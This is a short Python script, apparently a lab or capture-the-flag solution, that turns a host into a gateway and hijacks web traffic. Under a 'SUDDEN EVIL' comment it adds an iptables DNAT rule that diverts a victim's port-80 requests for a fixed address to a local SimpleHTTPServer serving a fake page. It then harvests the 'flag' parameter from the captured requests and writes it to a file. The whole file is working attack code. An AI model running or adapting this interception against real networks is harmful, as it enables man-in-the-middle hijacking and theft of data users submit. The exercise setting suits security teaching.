#!/usr/bin/python3
import os, sys, subprocess
from urllib import parse

def run():
    
    # this is an example on how to run a shell command (iptables for instance)
    subprocess.Popen('iptables -F', shell=True)
    subprocess.Popen('iptables -F -t nat', shell=True)
    subprocess.Popen('iptables -F -t mangle', shell=True)

    # set up proper gateway
    subprocess.Popen('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE', shell=True)
    subprocess.Popen('iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT', shell=True)
    subprocess.Popen('iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT', shell=True)

    # SUDDEN EVIL
    subprocess.Popen('iptables -t nat -A PREROUTING -p tcp -i eth1 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080', shell=True)

    # generate malicious html page
    subprocess.Popen('echo -n Welcome to the DarkLab>/shared/index.html', shell=True)
    
    # this is an example on how to run a shell command, redirect its output to a pipe and read that pipe while the command is running
    # stderr is redirect to stdout
    # stdout is redirected to the PIPE
    # cwd is the current working directory
    proc = subprocess.Popen('python2.7 -m SimpleHTTPServer 8080', stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=r'/shared', shell=True)
    
    flag = ''
    while(len(flag) == 0):
        for line in iter(proc.stdout.readline, b''):
                # print each line
                line = line.decode('utf-8')
                line = parse.urlsplit(line)
                line = parse.parse_qs(line.query)

                try:
                    flag = line['flag'][0].split(' ')[0]
                    if(len(flag) > 0):
                    # got the flag
                        proc.terminate()
                    break
                except:
                    pass

    # export it
    subprocess.Popen('echo -n ' + flag + '>/shared/flag.txt', shell=True)
    sys.exit(0)

if __name__ == "__main__":
    run()
